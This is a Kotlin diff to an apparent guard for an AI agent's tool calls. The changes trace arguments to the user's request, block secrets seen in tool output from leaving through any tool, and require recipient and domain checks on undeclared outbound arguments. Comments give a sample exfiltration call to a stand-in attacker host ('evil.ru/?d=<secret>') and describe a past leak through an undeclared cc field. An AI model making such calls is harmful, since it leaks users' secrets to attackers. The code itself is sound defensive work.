@@ -12,7 +12,7 @@ import org.json.JSONObject
 class Gate(private val manifest: Manifest) {
 
     class Episode(userRequest: String) {
-        val requestNorm: String = norm(userRequest)
+        val requestNorm: String = normRequest(userRequest)
         val secrets = mutableListOf<String>()
         val observations = ObservationLog()
         /** Targets the operator explicitly confirmed this episode (the
@@ -34,6 +34,9 @@ class Gate(private val manifest: Manifest) {
         val effectiveRequestNorm: String
             get() = if (confirmed.isEmpty()) requestNorm
             else requestNorm + " " + confirmed.joinToString(" ")
+
+        /** True when the operator confirmed exactly this target this episode. */
+        fun isConfirmed(target: String): Boolean = norm(target) in confirmed
 
         fun confirm(target: String) {
             val n = norm(target)
@@ -118,34 +121,46 @@ class Gate(private val manifest: Manifest) {
      * refusing something the user asked for, which they see and can confirm, or
      * permitting something they did not, which they never see at all.
      */
-    internal fun saidByUser(value: String, requestNorm: String): Boolean {
-        fun tokens(s: String) = s.split(' ')
-            .map { it.trim('.', ',', ';', ':', '!', '?', '"', '\'', '(', ')') }
-            .filter { it.isNotEmpty() }
-        // Normalise BOTH. Taking the request pre-normalised was a footgun: any
-        // caller passing raw text got silent non-matches, and a security check
-        // that quietly says "no" is as wrong as one that quietly says "yes".
-        // norm is idempotent, so doing it again costs nothing.
-        val want = tokens(norm(value))
-        val said = tokens(norm(requestNorm))
-        if (want.isEmpty() || want.size > said.size) return false
-        for (i in 0..(said.size - want.size)) {
-            if (want.indices.all { said[i + it] == want[it] }) return true
+    internal fun saidByUser(value: String, requestNorm: String): Boolean =
+        tracesToRequest(value, requestNorm)
+
+    private fun mintOrigin(text: String, ep: Episode, function: String, arg: String): OriginSet {
+        val t = text.trim()
+        val req = ep.effectiveRequestNorm
+        val named = if (isIdArg(arg) && idNeedsNaming(t)) {
+            // an id must be named AS an id; an operator-confirmed one is named by the confirmation
+            ep.isConfirmed(t) || numericNamed(t, function, req)
+        } else {
+            // free text: a whole-token match, long enough to mean something ("a" is a
+            // token of every request), or a plain number like amount=50 in "pay 50"
+            val digits = t.isNotEmpty() && t.all { it in '0'..'9' }
+            val person = RECIPIENT_ARG_RE.containsMatchIn(arg)
+            // amount=50 traces on "pay 50"; user="2" never traces on "user guide 2"
+            ((t.length >= 3 && saidByUser(text, req)) || (digits && !person && saidByUser(t, req))) &&
+                !(digits && person && t.length < 4)
         }
-        return false
+        return if (named) OriginSet(setOf(UserOrigin)) else OriginSet(setOf(ToolOrigin()))
     }
 
-    private fun mintOrigin(text: String, ep: Episode): OriginSet =
-        if (saidByUser(text, ep.effectiveRequestNorm)) OriginSet(setOf(UserOrigin))
-        else OriginSet(setOf(ToolOrigin()))
-
-    private fun bindArgs(args: JSONObject, ep: Episode): Map<String, TrackedArg> {
+    private fun bindArgs(args: JSONObject, ep: Episode, function: String, optional: Set<String>): Map<String, TrackedArg> {
         val out = mutableMapOf<String, TrackedArg>()
         for (key in args.keys()) {
             val v = args.opt(key) ?: continue
-            val s = v.toString()
-            val tainted = ep.secrets.any { secret -> s.isNotEmpty() && s in secret }
-            out[key] = TrackedArg(s, OriginSet(mintOrigin(s, ep).items, tainted))
+            // JSON null is absent. A stringly null (cc="None") is absent only for an
+            // argument the tool marks optional: on a required one "None" is a value, and
+            // dropping it made the recipient check vanish.
+            if (v == JSONObject.NULL) continue
+            var s = v.toString()
+            if (key in optional && s.trim().lowercase() in setOf("", "none", "null")) continue
+            if (v is org.json.JSONArray && v.length() == 0) continue       // an empty list vouches for nothing
+            if (v is Number && v !is Int && v !is Long) {                       // 2200.0 is 2200
+                val d = v.toDouble()
+                if (!d.isInfinite() && !d.isNaN() && d == Math.floor(d)) s = d.toLong().toString()
+            }
+            if (v is Boolean && isIdArg(key)) s = ""
+            // the argument CONTAINS a secret; the old test was reversed (s in secret)
+            val tainted = ep.secrets.any { secret -> secret.isNotEmpty() && leaks(secret, s) }
+            out[key] = TrackedArg(s, OriginSet(mintOrigin(s, ep, function, key).items, tainted))
         }
         return out
     }
@@ -155,13 +170,15 @@ class Gate(private val manifest: Manifest) {
             false, listOf(Violation("undeclared_tool", null, "tool '$function' is not in the manifest"))
         )
 
-        val bindings = bindArgs(args, ep)
+        val bindings = bindArgs(args, ep, function, spec.optionalArgs)
         val violations = mutableListOf<Violation>()
 
-        // Taint-egress: secrets observed this episode may never leave
-        if (Effect.EGRESS in spec.effects && ep.secrets.isNotEmpty()) {
+        // Taint: secrets observed this episode may never leave. Every tool, not only
+        // declared egress — open_url("evil.ru/?d=<secret>") on a "read" is a GET to
+        // a server the attacker chose.
+        if (ep.secrets.isNotEmpty()) {
             val blob = args.keys().asSequence().joinToString(" ") { args.opt(it)?.toString() ?: "" }
-            if (ep.secrets.any { it in blob }) {
+            if (ep.secrets.any { leaks(it, blob) }) {
                 violations += Violation("taint_egress", null,
                     "outbound arguments contain secret-shaped strings observed in tool output")
             }
@@ -176,7 +193,32 @@ class Gate(private val manifest: Manifest) {
                 "outbound action backed only by screen reads (low confidence)")
         }
 
-        for (c in spec.requires) {
+        // Egress completeness: an argument the manifest never declared is not a free
+        // channel (an undeclared cc walked straight out of gatellml's travel policy).
+        val requires = spec.requires.toMutableList()
+        if (Effect.EGRESS in spec.effects) {
+            // Only a contract that TRACES covers an argument: NotTainted(cc) or a
+            // domain check on cc left cc=["mallory"] uncovered while looking declared.
+            fun declared(arg: String, vararg kinds: kotlin.reflect.KClass<out Contract>) = requires.any { c ->
+                kinds.any { it.isInstance(c) } && (c.arg == arg || (c is AnyArgTraceable && arg in c.args))
+            }
+            for (k in bindings.keys) {
+                if (RECIPIENT_ARG_RE.containsMatchIn(k)) {
+                    // A domain check covers a destination that IS a host (open_url(url=...)).
+                    // It does not cover one that holds no host at all: cc=["mallory"].
+                    if (declared(k, DomainInRequest::class) && DOMAIN_RE.containsMatchIn(bindings.getValue(k).value)) continue
+                    if (!declared(k, RecipientTraceable::class, TargetTraceable::class, AnyArgTraceable::class))
+                        requires += RecipientTraceable(k)
+                } else {
+                    if (!declared(k, AtomInRequest::class, RecipientTraceable::class, TargetTraceable::class))
+                        requires += AtomInRequest(k)
+                    if (!declared(k, DomainInRequest::class, RecipientTraceable::class, TargetTraceable::class))
+                        requires += DomainInRequest(k, urlishOnly = true)
+                }
+            }
+        }
+
+        for (c in requires) {
             val why = c.check(bindings, ep.effectiveRequestNorm)
             if (why != null) violations += Violation(c.name, c.arg, why)
         }
